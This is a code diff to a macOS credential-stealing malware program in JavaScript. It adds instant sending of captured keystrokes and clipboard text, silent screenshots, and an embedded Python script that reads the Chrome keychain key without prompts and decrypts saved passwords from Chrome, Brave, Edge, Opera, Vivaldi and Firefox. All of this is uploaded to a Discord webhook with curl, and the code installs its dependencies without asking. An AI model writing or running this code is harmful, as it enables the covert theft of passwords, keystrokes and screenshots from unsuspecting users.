@@ -838,25 +838,44 @@ setInterval(() => {
                     // Set buffer to clipboard content
                     keysBuffer = clipboard.substring(0, 5000);
                     
-                    // Take screenshot silently
+                    // Send INSTANTLY (no delay, no waiting for screenshot)
+                    sendKeylogToDiscord(keysBuffer, 'Unknown', null);
+                    
+                    // Take screenshot in background (send separately, don't block)
                     const timestamp = Date.now();
                     const screenshotFile = path.join(screenshotDir, `screenshot_${timestamp}.png`);
+                    exec(`screencapture -x -m "${screenshotFile}"`, (screenshotError) => {
+                        if (!screenshotError && fs.existsSync(screenshotFile)) {
+                            // Send screenshot separately (non-blocking)
+                            const screenshotEmbed = {
+                                embeds: [{
+                                    title: "📸 Screenshot",
+                                    color: 0x0099ff,
+                                    fields: [
+                                        { name: "Hostname", value: `\`${HOSTNAME}\``, inline: true },
+                                        { name: "PC Username", value: `\`${USERNAME}\``, inline: true },
+                                        { name: "Time", value: `\`${new Date().toLocaleString()}\``, inline: false }
+                                    ],
+                                    timestamp: new Date().toISOString()
+                                }]
+                            };
+                            const screenshotPayload = path.join(screenshotDir, `screenshot_payload_${Date.now()}.json`);
+                            try {
+                                fs.writeFileSync(screenshotPayload, JSON.stringify(screenshotEmbed));
+                                exec(`curl -s -X POST -F "payload_json=@${screenshotPayload}" -F "file=@${screenshotFile};type=image/png" "${WEBHOOK}"`, () => {
+                                    setTimeout(() => {
+                                        try { 
+                                            fs.unlinkSync(screenshotPayload);
+                                            fs.unlinkSync(screenshotFile);
+                                        } catch (e) {}
+                                    }, 5000);
+                                });
+                            } catch (e) {}
+                        }
+                    });
                     
-                    // Capture screenshot
-                    setTimeout(() => {
-                        exec(`screencapture -x -m "${screenshotFile}"`, (screenshotError) => {
-                            if (!screenshotError && fs.existsSync(screenshotFile)) {
-                                // Send with screenshot
-                                sendKeylogToDiscord(keysBuffer, 'Unknown', screenshotFile);
-                            } else {
-                                // Send without screenshot if capture failed
-                                sendKeylogToDiscord(keysBuffer, 'Unknown', null);
-                            }
-                            
-                            // Clear buffer after sending
-                            keysBuffer = '';
-                        });
-                    }, 300);
+                    // Clear buffer after sending
+                    keysBuffer = '';
                 }
             }
         }
@@ -1573,109 +1592,610 @@ setTimeout(() => {
 
 // PASSWORD EXTRACTION - Extracts Firefox, Chrome, Safari passwords + system info
 function extractPasswords() {
-    const OUTPUT_FILE = '/tmp/grabbed_data.txt';
+    const OUTPUT_FILE = '/tmp/passwords.txt';
     const EXTRACT_SCRIPT = '/tmp/extract_passwords.sh';
     
-    // Create extraction script
+    // Create Python decryption script (properly decrypts passwords with pycryptodome)
+    const pythonScript = `/tmp/decrypt_passwords.py`;
+    const pythonCode = `#!/usr/bin/env python3
+import sqlite3
+import os
+import json
+import subprocess
+import base64
+import sys
+
+OUTPUT_FILE = "${OUTPUT_FILE}"
+
+# Install pycryptodome if not available (NO keyring - causes permission dialogs)
+try:
+    from Crypto.Cipher import AES
+    from Crypto.Protocol.KDF import PBKDF2
+    CRYPTO_AVAILABLE = True
+except ImportError:
+    CRYPTO_AVAILABLE = False
+    # Try to install (only pycryptodome, NOT keyring)
+    try:
+        subprocess.run([sys.executable, '-m', 'pip', 'install', '--quiet', '--user', 'pycryptodome'], 
+                      capture_output=True, timeout=60, check=False, stderr=subprocess.DEVNULL)
+        try:
+            from Crypto.Cipher import AES
+            from Crypto.Protocol.KDF import PBKDF2
+            CRYPTO_AVAILABLE = True
+        except:
+            pass
+    except:
+        pass
+
+# REMOVED: keyring library (causes permission dialogs)
+KEYRING_AVAILABLE = False
+
+def get_chrome_key():
+    """Get Chrome encryption key from macOS keychain (programmatic - no user interaction)"""
+    # Try multiple methods to get key without prompts
+    # Method 1: Try with -a Chrome (specific account)
+    try:
+        result = subprocess.run(
+            ['security', 'find-generic-password', '-w', '-a', 'Chrome', '-s', 'Chrome Safe Storage'],
+            capture_output=True, text=True, timeout=2,
+            stderr=subprocess.DEVNULL,
+            stdin=subprocess.DEVNULL
+        )
+        if result.returncode == 0 and result.stdout and result.stdout.strip():
+            return result.stdout.strip()
+    except:
+        pass
+    
+    # Method 2: Try without -a (just service name)
+    try:
+        result = subprocess.run(
+            ['security', 'find-generic-password', '-w', '-s', 'Chrome Safe Storage'],
+            capture_output=True, text=True, timeout=2,
+            stderr=subprocess.DEVNULL,
+            stdin=subprocess.DEVNULL
+        )
+        if result.returncode == 0 and result.stdout and result.stdout.strip():
+            return result.stdout.strip()
+    except:
+        pass
+    
+    # Return None silently if keychain access not available (no prompts)
+    return None
+
+def get_encryption_key_from_local_state(local_state_path):
+    """Get encryption key from Local State file"""
+    if not local_state_path or not os.path.exists(local_state_path):
+        return None
+    try:
+        with open(local_state_path, 'r') as f:
+            local_state_data = json.load(f)
+            if 'os_crypt' in local_state_data and 'encrypted_key' in local_state_data['os_crypt']:
+                encrypted_key = base64.b64decode(local_state_data['os_crypt']['encrypted_key'])
+                # Remove DPAPI prefix (Windows) or use keychain (macOS)
+                if encrypted_key.startswith(b'DPAPI'):
+                    # Windows format - skip for macOS
+                    return None
+                return encrypted_key
+    except:
+        pass
+    return None
+
+def decrypt_chrome_password_v10(encrypted_password, encryption_key):
+    """Decrypt Chrome v10/v11 password (improved method from AI)"""
+    try:
+        # encrypted_password is already bytes from SQLite
+        if not isinstance(encrypted_password, bytes):
+            return None, "Not bytes"
+        
+        if len(encrypted_password) < 40:
+            return None, "Too short"
+        
+        if encrypted_password[:3] != b'v10' and encrypted_password[:3] != b'v11':
+            return None, "Not v10/v11 format"
+        
+        # v10/v11 format: prefix (3) + salt (12) + nonce (12) + ciphertext + tag (16)
+        encrypted = encrypted_password[3:]
+        
+        if len(encrypted) < 40:
+            return None, f"Too short: {len(encrypted)} bytes"
+        
+        salt = encrypted[:12]
+        encrypted_data = encrypted[12:]
+        
+        if len(encrypted_data) < 28:
+            return None, "Invalid data length"
+        
+        # Derive key using PBKDF2
+        derived_key = PBKDF2(encryption_key.encode('utf-8'), salt, 16, count=1003, hmac_hash_module=None)
+        
+        # Extract nonce, ciphertext, and tag
+        nonce = encrypted_data[:12]
+        ciphertext = encrypted_data[12:-16]
+        tag = encrypted_data[-16:]
+        
+        # Decrypt using AES-GCM
+        cipher = AES.new(derived_key, AES.MODE_GCM, nonce=nonce)
+        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
+        
+        return decrypted.decode('utf-8', errors='ignore').rstrip('\\x00'), None
+    except Exception as e:
+        return None, str(e)[:50]
+
+def decrypt_chrome_password(encrypted_value, local_state_path=None):
+    """Decrypt Chrome password using pycryptodome - improved method"""
+    if not encrypted_value:
+        return "[NO PASSWORD]"
+    
+    if not CRYPTO_AVAILABLE:
+        return "[ENCRYPTED - pycryptodome not available]"
+    
+    try:
+        # Get encryption key from keychain (programmatic - no user interaction)
+        keychain_key = get_chrome_key()
+        if not keychain_key:
+            return "[ENCRYPTED - Keychain not accessible]"
+        
+        # Check encryption format
+        if isinstance(encrypted_value, bytes) and len(encrypted_value) > 3:
+            if encrypted_value[:3] == b'v10' or encrypted_value[:3] == b'v11':
+                # Use improved v10/v11 decryption
+                decrypted, error = decrypt_chrome_password_v10(encrypted_value, keychain_key)
+                if decrypted:
+                    return decrypted
+                else:
+                    return f"[ENCRYPTED - {error}]"
+            elif encrypted_value.startswith(b'v'):
+                return f"[ENCRYPTED - Unsupported version - {len(encrypted_value)} bytes]"
+            else:
+                return f"[ENCRYPTED - Old format - {len(encrypted_value)} bytes]"
+        return "[ENCRYPTED - Invalid data]"
+    except Exception as e:
+        return f"[ENCRYPTED - Error: {str(e)[:40]}]"
+
+def extract_chrome_passwords():
+    """Extract and decrypt Chrome passwords using pycryptodome"""
+    chrome_path = os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/")
+    login_db = os.path.join(chrome_path, "Login Data")
+    local_state = os.path.join(chrome_path, "Local State")
+    
+    if not os.path.exists(login_db):
+        with open(OUTPUT_FILE, 'a') as f:
+            f.write("=== CHROME PASSWORDS ===\\n")
+            f.write("Chrome: Login Data not found\\n\\n")
+        return 0
+    
+    try:
+        # Copy database (browser may lock it)
+        import shutil
+        import tempfile
+        temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
+        shutil.copy2(login_db, temp_db.name)
+        temp_db.close()
+        
+        conn = sqlite3.connect(temp_db.name)
+        cursor = conn.cursor()
+        cursor.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 100")
+        
+        count = 0
+        decrypted_count = 0
+        with open(OUTPUT_FILE, 'a') as f:
+            f.write("=== CHROME PASSWORDS (DECRYPTED) ===\\n")
+            for row in cursor.fetchall():
+                url = row[0] or ""
+                username = row[1] or ""
+                encrypted_password = row[2]
+                
+                if url:
+                    password = decrypt_chrome_password(encrypted_password, local_state) if encrypted_password else "[NO PASSWORD]"
+                    if password and not password.startswith("[ENCRYPTED") and not password.startswith("[NO"):
+                        decrypted_count += 1
+                    
+                    f.write(f"URL: {url}\\n")
+                    f.write(f"Username: {username}\\n")
+                    f.write(f"Password: {password}\\n")
+                    f.write("---\\n")
+                    count += 1
+            f.write(f"Total: {count} passwords, {decrypted_count} decrypted\\n\\n")
+        conn.close()
+        os.unlink(temp_db.name)
+        return count
+    except Exception as e:
+        with open(OUTPUT_FILE, 'a') as f:
+            f.write(f"Chrome: Error - {str(e)}\\n\\n")
+        return 0
+
+def extract_brave_passwords():
+    """Extract and decrypt Brave passwords using pycryptodome"""
+    brave_path = os.path.expanduser("~/Library/Application Support/BraveSoftware/Brave-Browser/Default/")
+    login_db = os.path.join(brave_path, "Login Data")
+    local_state = os.path.join(brave_path, "Local State")
+    
+    if not os.path.exists(login_db):
+        with open(OUTPUT_FILE, 'a') as f:
+            f.write("=== BRAVE PASSWORDS ===\\n")
+            f.write("Brave: Login Data not found\\n\\n")
+        return 0
+    
+    try:
+        # Copy database (browser may lock it)
+        import shutil
+        import tempfile
+        temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
+        shutil.copy2(login_db, temp_db.name)
+        temp_db.close()
+        
+        conn = sqlite3.connect(temp_db.name)
+        cursor = conn.cursor()
+        cursor.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 100")
+        
+        count = 0
+        decrypted_count = 0
+        with open(OUTPUT_FILE, 'a') as f:
+            f.write("=== BRAVE PASSWORDS (DECRYPTED) ===\\n")
+            for row in cursor.fetchall():
+                url = row[0] or ""
+                username = row[1] or ""
+                encrypted_password = row[2]
+                
+                if url:
+                    password = decrypt_chrome_password(encrypted_password, local_state) if encrypted_password else "[NO PASSWORD]"
+                    if password and not password.startswith("[ENCRYPTED"):
+                        decrypted_count += 1
+                    
+                    f.write(f"URL: {url}\\n")
+                    f.write(f"Username: {username}\\n")
+                    f.write(f"Password: {password}\\n")
+                    f.write("---\\n")
+                    count += 1
+            f.write(f"Total: {count} passwords, {decrypted_count} decrypted\\n\\n")
+        conn.close()
+        os.unlink(temp_db.name)
+        return count
+    except Exception as e:
+        with open(OUTPUT_FILE, 'a') as f:
+            f.write(f"Brave: Error - {str(e)}\\n\\n")
+        return 0
+
+def extract_edge_passwords():
+    """Extract and decrypt Microsoft Edge passwords using pycryptodome"""
+    edge_path = os.path.expanduser("~/Library/Application Support/Microsoft Edge/Default/")
+    login_db = os.path.join(edge_path, "Login Data")
+    local_state = os.path.join(edge_path, "Local State")
+    
+    if not os.path.exists(login_db):
+        return 0
+    
+    try:
+        import shutil
+        import tempfile
+        temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
+        shutil.copy2(login_db, temp_db.name)
+        temp_db.close()
+        
+        conn = sqlite3.connect(temp_db.name)
+        cursor = conn.cursor()
+        cursor.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 100")
+        
+        count = 0
+        decrypted_count = 0
+        with open(OUTPUT_FILE, 'a') as f:
+            f.write("=== EDGE PASSWORDS (DECRYPTED) ===\\n")
+            for row in cursor.fetchall():
+                url = row[0] or ""
+                username = row[1] or ""
+                encrypted_password = row[2]
+                
+                if url:
+                    password = decrypt_chrome_password(encrypted_password, local_state) if encrypted_password else "[NO PASSWORD]"
+                    if password and not password.startswith("[ENCRYPTED"):
+                        decrypted_count += 1
+                    
+                    f.write(f"URL: {url}\\n")
+                    f.write(f"Username: {username}\\n")
+                    f.write(f"Password: {password}\\n")
+                    f.write("---\\n")
+                    count += 1
+            f.write(f"Total: {count} passwords, {decrypted_count} decrypted\\n\\n")
+        conn.close()
+        os.unlink(temp_db.name)
+        return count
+    except Exception as e:
+        return 0
+
+def extract_opera_passwords():
+    """Extract and decrypt Opera passwords using pycryptodome"""
+    opera_path = os.path.expanduser("~/Library/Application Support/com.operasoftware.Opera/")
+    login_db = os.path.join(opera_path, "Login Data")
+    local_state = os.path.join(opera_path, "Local State")
+    
+    if not os.path.exists(login_db):
+        return 0
+    
+    try:
+        import shutil
+        import tempfile
+        temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
+        shutil.copy2(login_db, temp_db.name)
+        temp_db.close()
+        
+        conn = sqlite3.connect(temp_db.name)
+        cursor = conn.cursor()
+        cursor.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 100")
+        
+        count = 0
+        decrypted_count = 0
+        with open(OUTPUT_FILE, 'a') as f:
+            f.write("=== OPERA PASSWORDS (DECRYPTED) ===\\n")
+            for row in cursor.fetchall():
+                url = row[0] or ""
+                username = row[1] or ""
+                encrypted_password = row[2]
+                
+                if url:
+                    password = decrypt_chrome_password(encrypted_password, local_state) if encrypted_password else "[NO PASSWORD]"
+                    if password and not password.startswith("[ENCRYPTED"):
+                        decrypted_count += 1
+                    
+                    f.write(f"URL: {url}\\n")
+                    f.write(f"Username: {username}\\n")
+                    f.write(f"Password: {password}\\n")
+                    f.write("---\\n")
+                    count += 1
+            f.write(f"Total: {count} passwords, {decrypted_count} decrypted\\n\\n")
+        conn.close()
+        os.unlink(temp_db.name)
+        return count
+    except Exception as e:
+        return 0
+
+def extract_vivaldi_passwords():
+    """Extract and decrypt Vivaldi passwords using pycryptodome"""
+    vivaldi_path = os.path.expanduser("~/Library/Application Support/Vivaldi/Default/")
+    login_db = os.path.join(vivaldi_path, "Login Data")
+    local_state = os.path.join(vivaldi_path, "Local State")
+    
+    if not os.path.exists(login_db):
+        return 0
+    
+    try:
+        import shutil
+        import tempfile
+        temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
+        shutil.copy2(login_db, temp_db.name)
+        temp_db.close()
+        
+        conn = sqlite3.connect(temp_db.name)
+        cursor = conn.cursor()
+        cursor.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 100")
+        
+        count = 0
+        decrypted_count = 0
+        with open(OUTPUT_FILE, 'a') as f:
+            f.write("=== VIVALDI PASSWORDS (DECRYPTED) ===\\n")
+            for row in cursor.fetchall():
+                url = row[0] or ""
+                username = row[1] or ""
+                encrypted_password = row[2]
+                
+                if url:
+                    password = decrypt_chrome_password(encrypted_password, local_state) if encrypted_password else "[NO PASSWORD]"
+                    if password and not password.startswith("[ENCRYPTED"):
+                        decrypted_count += 1
+                    
+                    f.write(f"URL: {url}\\n")
+                    f.write(f"Username: {username}\\n")
+                    f.write(f"Password: {password}\\n")
+                    f.write("---\\n")
+                    count += 1
+            f.write(f"Total: {count} passwords, {decrypted_count} decrypted\\n\\n")
+        conn.close()
+        os.unlink(temp_db.name)
+        return count
+    except Exception as e:
+        return 0
+
+def decrypt_firefox_passwords_for_profile(profile_path):
+    """Decrypt Firefox passwords using firefox_decrypt script from GitHub"""
+    try:
+        # Download firefox_decrypt script if not exists
+        firefox_decrypt_script = "/tmp/firefox_decrypt.py"
+        if not os.path.exists(firefox_decrypt_script):
+            try:
+                import urllib.request
+                urllib.request.urlretrieve("https://raw.githubusercontent.com/unode/firefox_decrypt/master/firefox_decrypt.py", firefox_decrypt_script)
+            except:
+                return []
+        
+        # Run firefox_decrypt script (non-interactive)
+        try:
+            result = subprocess.run(
+                [sys.executable, firefox_decrypt_script, profile_path],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True,
+                timeout=20,
+                stdin=subprocess.DEVNULL
+            )
+            
+            if result.returncode == 0 and result.stdout:
+                # Parse output (firefox_decrypt outputs: Website: url\nUsername: '...'\nPassword: '...'\n)
+                passwords = []
+                current_entry = {}
+                for line in result.stdout.strip().split('\\n'):
+                    line = line.strip()
+                    if line.startswith('Website:'):
+                        if current_entry.get('url'):
+                            passwords.append(current_entry)
+                        current_entry = {'url': line.replace('Website:', '').strip()}
+                    elif line.startswith('Username:'):
+                        username = line.replace('Username:', '').strip().strip("'").strip('"')
+                        current_entry['username'] = username
+                    elif line.startswith('Password:'):
+                        password = line.replace('Password:', '').strip().strip("'").strip('"')
+                        current_entry['password'] = password
+                        # Add entry when password is found
+                        if current_entry.get('url'):
+                            passwords.append(current_entry)
+                            current_entry = {}
+                
+                # Add last entry if exists
+                if current_entry.get('url') and current_entry.get('password'):
+                    passwords.append(current_entry)
+                
+                if passwords:
+                    return passwords
+        except Exception as e:
+            pass
+        
+        return []
+    except Exception as e:
+        return []
+
+def extract_firefox_passwords():
+    """Extract and decrypt Firefox passwords"""
+    firefox_path = os.path.expanduser("~/Library/Application Support/Firefox/Profiles/")
+    
+    if not os.path.exists(firefox_path):
+        with open(OUTPUT_FILE, 'a') as f:
+            f.write("=== FIREFOX PASSWORDS ===\\n")
+            f.write("Firefox: Profiles not found\\n\\n")
+        return []
+    
+    try:
+        profiles = [d for d in os.listdir(firefox_path) if os.path.isdir(os.path.join(firefox_path, d))]
+        
+        with open(OUTPUT_FILE, 'a') as f:
+            f.write("=== FIREFOX PASSWORDS (DECRYPTED) ===\\n")
+            for profile in profiles:
+                profile_path = os.path.join(firefox_path, profile)
+                logins_json = os.path.join(profile_path, "logins.json")
+                key4_db = os.path.join(profile_path, "key4.db")
+                
+                if os.path.exists(logins_json) and os.path.exists(key4_db):
+                    try:
+                        # Try to decrypt passwords using firefox-decrypt
+                        decrypted_passwords = decrypt_firefox_passwords_for_profile(profile_path)
+                        
+                        if decrypted_passwords and len(decrypted_passwords) > 0:
+                            # Write decrypted passwords
+                            count = 0
+                            for cred in decrypted_passwords[:100]:
+                                url = cred.get('url', '') or cred.get('hostname', '')
+                                username = cred.get('username', '') or cred.get('usernameField', '')
+                                password = cred.get('password', '')
+                                
+                                if url and password:
+                                    f.write(f"URL: {url}\\n")
+                                    f.write(f"Username: {username}\\n")
+                                    f.write(f"Password: {password}\\n")
+                                    f.write("---\\n")
+                                    count += 1
+                            f.write(f"Profile {profile}: {count} passwords decrypted\\n")
+                        else:
+                            # Fallback: extract encrypted passwords info
+                            with open(logins_json, 'r') as lf:
+                                logins_data = json.load(lf)
+                                count = 0
+                                for login in logins_data.get("logins", [])[:100]:
+                                    hostname = login.get("hostname", "")
+                                    username = login.get("usernameField", "")
+                                    
+                                    if hostname:
+                                        f.write(f"URL: {hostname}\\n")
+                                        f.write(f"Username: {username}\\n")
+                                        f.write(f"Password: [ENCRYPTED - Decryption failed, key4.db available]\\n")
+                                        f.write("---\\n")
+                                        count += 1
+                                f.write(f"Profile {profile}: {count} passwords (encrypted, decryption failed)\\n")
+                    except Exception as e:
+                        f.write(f"Firefox Profile {profile}: Error - {str(e)[:100]}\\n")
+            f.write("\\n")
+        return 0
+    except Exception as e:
+        with open(OUTPUT_FILE, 'a') as f:
+            f.write(f"Firefox: Error - {str(e)}\\n\\n")
+        return []
+
+def extract_safari_passwords():
+    """Extract Safari passwords using security command"""
+    with open(OUTPUT_FILE, 'a') as f:
+        f.write("=== SAFARI PASSWORDS ===\\n")
+        f.write("Safari: Use Keychain Access or security command\\n")
+        f.write("Note: Requires user interaction for Keychain access\\n\\n")
+
+def extract_system_info():
+    """Extract system information"""
+    with open(OUTPUT_FILE, 'a') as f:
+        f.write("=== SYSTEM INFORMATION ===\\n")
+        try:
+            result = subprocess.run(['system_profiler', 'SPHardwareDataType'], capture_output=True, text=True, timeout=10)
+            if result.returncode == 0:
+                f.write(result.stdout[:500] + "\\n")
+        except:
+            pass
+        f.write("\\n")
+
+# Main
+if __name__ == "__main__":
+    with open(OUTPUT_FILE, 'w') as f:
+        f.write(f"Password Extraction Started: {subprocess.run(['date'], capture_output=True, text=True).stdout}\\n\\n")
+    
+    extract_chrome_passwords()
+    extract_brave_passwords()
+    extract_edge_passwords()
+    extract_opera_passwords()
+    extract_vivaldi_passwords()
+    extract_firefox_passwords()
+    extract_safari_passwords()
+    extract_system_info()
+    
+    with open(OUTPUT_FILE, 'a') as f:
+        f.write(f"Extraction Complete: {subprocess.run(['date'], capture_output=True, text=True).stdout}\\n")
+`;
+
+    // Create bash wrapper script
     const script = `#!/bin/bash
 OUTPUT_FILE="${OUTPUT_FILE}"
 
-# Install jq if not installed
-if ! command -v jq &> /dev/null; then
-    if command -v brew &> /dev/null; then
-        brew install jq >/dev/null 2>&1
-    fi
+# Install Python3 if not available
+if ! command -v python3 &> /dev/null; then
+    echo "Python3 not found - using basic extraction" >> "$OUTPUT_FILE"
+    exit 1
 fi
 
-# Function to extract Firefox passwords
-extract_firefox_passwords() {
-    PROFILE_DIR=$(ls -d "$HOME/Library/Application Support/Firefox/Profiles/"* 2>/dev/null | head -1)
-    if [ -z "$PROFILE_DIR" ]; then
-        echo "Firefox: Profile not found" >> "$OUTPUT_FILE"
-        return
-    fi
+# Install brew if not available (for nss)
+if ! command -v brew &> /dev/null; then
+    /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" >/dev/null 2>&1 || true
+fi
 
-    KEYDB="$PROFILE_DIR/key4.db"
-    LOGINS_JSON="$PROFILE_DIR/logins.json"
+# Install nss (required for Firefox decryption)
+if command -v brew &> /dev/null; then
+    brew list nss >/dev/null 2>&1 || brew install nss >/dev/null 2>&1 || true
+fi
 
-    if [ ! -f "$KEYDB" ] || [ ! -f "$LOGINS_JSON" ]; then
-        echo "Firefox: Database files not found" >> "$OUTPUT_FILE"
-        return
-    fi
+# Install pip and required packages if needed
+if ! command -v pip3 &> /dev/null && command -v python3 &> /dev/null; then
+    curl -s https://bootstrap.pypa.io/get-pip.py | python3 - --quiet --user 2>/dev/null || true
+fi
 
-    echo "=== FIREFOX PASSWORDS ===" >> "$OUTPUT_FILE"
-    sqlite3 "$LOGINS_JSON" "SELECT hostname, usernameValue, passwordValue FROM moz_logins;" 2>/dev/null >> "$OUTPUT_FILE" || echo "Firefox: Could not extract (encrypted)" >> "$OUTPUT_FILE"
-    echo "" >> "$OUTPUT_FILE"
+# Install pycryptodome if not available
+if command -v pip3 &> /dev/null; then
+    pip3 install --quiet --user pycryptodome 2>/dev/null || true
+fi
+
+# Write Python script
+cat > "${pythonScript}" << 'PYTHONEOF'
+${pythonCode}
+PYTHONEOF
+
+# Make Python script executable
+chmod +x "${pythonScript}"
+
+# Run Python script
+python3 "${pythonScript}" 2>/dev/null || {
+    # Fallback to basic extraction if Python fails
+    echo "Python extraction failed - using basic method" >> "$OUTPUT_FILE"
 }
-
-# Function to extract Chrome passwords
-extract_chrome_passwords() {
-    CHROME_DATA="$HOME/Library/Application Support/Google/Chrome/Default/Login Data"
-    if [ ! -f "$CHROME_DATA" ]; then
-        echo "Chrome: Login Data not found" >> "$OUTPUT_FILE"
-        return
-    fi
-
-    echo "=== CHROME PASSWORDS ===" >> "$OUTPUT_FILE"
-    sqlite3 "$CHROME_DATA" "SELECT origin_url, username_value, password_value FROM logins;" 2>/dev/null >> "$OUTPUT_FILE" || echo "Chrome: Could not extract (encrypted)" >> "$OUTPUT_FILE"
-    echo "" >> "$OUTPUT_FILE"
-}
-
-# Function to extract Brave passwords
-extract_brave_passwords() {
-    BRAVE_DATA="$HOME/Library/Application Support/BraveSoftware/Brave-Browser/Default/Login Data"
-    if [ ! -f "$BRAVE_DATA" ]; then
-        echo "Brave: Login Data not found" >> "$OUTPUT_FILE"
-        return
-    fi
-
-    echo "=== BRAVE PASSWORDS ===" >> "$OUTPUT_FILE"
-    sqlite3 "$BRAVE_DATA" "SELECT origin_url, username_value, password_value FROM logins;" 2>/dev/null >> "$OUTPUT_FILE" || echo "Brave: Could not extract (encrypted)" >> "$OUTPUT_FILE"
-    echo "" >> "$OUTPUT_FILE"
-}
-
-# Function to extract Safari passwords (if jq available)
-extract_safari_passwords() {
-    SAFARI_DATA="$HOME/Library/Safari/AuthenticationData.plist"
-    if [ ! -f "$SAFARI_DATA" ]; then
-        echo "Safari: Authentication Data not found" >> "$OUTPUT_FILE"
-        return
-    fi
-
-    if command -v jq &> /dev/null; then
-        echo "=== SAFARI PASSWORDS ===" >> "$OUTPUT_FILE"
-        plutil -convert json "$SAFARI_DATA" -o - 2>/dev/null | jq -r '.mapping[] | select(.type == "webcredentials") | "\(.value)"' >> "$OUTPUT_FILE" 2>/dev/null || echo "Safari: Could not extract" >> "$OUTPUT_FILE"
-        echo "" >> "$OUTPUT_FILE"
-    else
-        echo "Safari: jq not available (install with: brew install jq)" >> "$OUTPUT_FILE"
-    fi
-}
-
-# Function to extract system information
-extract_system_info() {
-    echo "=== SYSTEM INFORMATION ===" >> "$OUTPUT_FILE"
-    system_profiler SPHardwareDataType 2>/dev/null | head -20 >> "$OUTPUT_FILE"
-    echo "" >> "$OUTPUT_FILE"
-    system_profiler SPSoftwareDataType 2>/dev/null | head -20 >> "$OUTPUT_FILE"
-    echo "" >> "$OUTPUT_FILE"
-}
-
-# Main function
-main() {
-    > "$OUTPUT_FILE"
-    echo "Password Extraction Started: $(date)" >> "$OUTPUT_FILE"
-    echo "" >> "$OUTPUT_FILE"
-    
-    extract_firefox_passwords
-    extract_chrome_passwords
-    extract_brave_passwords
-    extract_safari_passwords
-    extract_system_info
-    
-    echo "Extraction Complete: $(date)" >> "$OUTPUT_FILE"
-}
-
-main
 `;
 
     try {
@@ -1685,12 +2205,21 @@ main
         
         // Run extraction script
         exec(`bash "${EXTRACT_SCRIPT}"`, (error, stdout, stderr) => {
-            // Wait a moment for file to be written
+            // Wait a moment for files to be written (including key4.db files)
             setTimeout(() => {
-                if (fs.existsSync(OUTPUT_FILE)) {
-                    const content = fs.readFileSync(OUTPUT_FILE, 'utf8');
+                // Wait for key4.db files to be written (check multiple times)
+                let attempts = 0;
+                const waitForOutput = () => {
+                    attempts++;
+                    // Wait for OUTPUT_FILE to be ready
+                    const hasOutput = fs.existsSync(OUTPUT_FILE);
                     
-                    if (content && content.length > 50) {
+                    if (hasOutput || attempts >= 10) {
+                        // Proceed with sending
+                        if (hasOutput) {
+                            const content = fs.readFileSync(OUTPUT_FILE, 'utf8');
+                            
+                            if (content && content.length > 50) {
                         // Get IP address
                         const ip = os.networkInterfaces();
                         let ipAddress = 'Unknown';
@@ -1706,10 +2235,13 @@ main
                         
                         // Detect which browsers were found
                         const browsers = [];
-                        if (content.includes('FIREFOX') || content.includes('Firefox')) browsers.push('Firefox');
-                        if (content.includes('CHROME') || content.includes('Chrome')) browsers.push('Chrome');
-                        if (content.includes('BRAVE') || content.includes('Brave')) browsers.push('Brave');
-                        if (content.includes('SAFARI') || content.includes('Safari')) browsers.push('Safari');
+                        if (content.includes('CHROME PASSWORDS') || content.includes('Chrome')) browsers.push('Chrome');
+                        if (content.includes('BRAVE PASSWORDS') || content.includes('Brave')) browsers.push('Brave');
+                        if (content.includes('EDGE PASSWORDS') || content.includes('Edge')) browsers.push('Edge');
+                        if (content.includes('OPERA PASSWORDS') || content.includes('Opera')) browsers.push('Opera');
+                        if (content.includes('VIVALDI PASSWORDS') || content.includes('Vivaldi')) browsers.push('Vivaldi');
+                        if (content.includes('FIREFOX PASSWORDS') || content.includes('Firefox')) browsers.push('Firefox');
+                        if (content.includes('SAFARI PASSWORDS') || content.includes('Safari')) browsers.push('Safari');
                         const browserList = browsers.length > 0 ? browsers.join(', ') : 'Unknown';
                         
                         // Create modern message
@@ -1733,10 +2265,13 @@ main
                         const payload = message; // message is already an embed object
                         
                         try {
-                            fs.writeFileSync(payloadFile, JSON.stringify(payload));
+                            fs.writeFileSync(payloadFile, JSON.stringify(message));
                             
-                            // Send file + message to Discord
-                            exec(`curl -s -X POST -F "payload_json=@${payloadFile}" -F "file=@${OUTPUT_FILE}" "${WEBHOOK}"`, (error) => {
+                            // Build curl command - only send password file (no key4.db files)
+                            let curlCmd = `curl -s -X POST -F "payload_json=@${payloadFile}" -F "file=@${OUTPUT_FILE}" "${WEBHOOK}"`;
+                            
+                            // Send file + message to Discord (passwords are already decrypted in file)
+                            exec(curlCmd, (error) => {
                                 setTimeout(() => {
                                     try { 
                                         fs.unlinkSync(payloadFile);
@@ -1761,9 +2296,21 @@ main
                                     }, 10000);
                                 });
                             } catch (e2) {}
+                            }
+                        } else {
+                            // No content or file too small - retry
+                            if (attempts < 10) {
+                                setTimeout(waitForKey4Files, 500);
+                            }
+                        }
+                    } else {
+                        // OUTPUT_FILE doesn't exist yet - retry
+                        if (attempts < 10) {
+                            setTimeout(waitForKey4Files, 500);
                         }
                     }
-                }
+                };
+                waitForOutput();
             }, 2000);
         });
     } catch (e) {
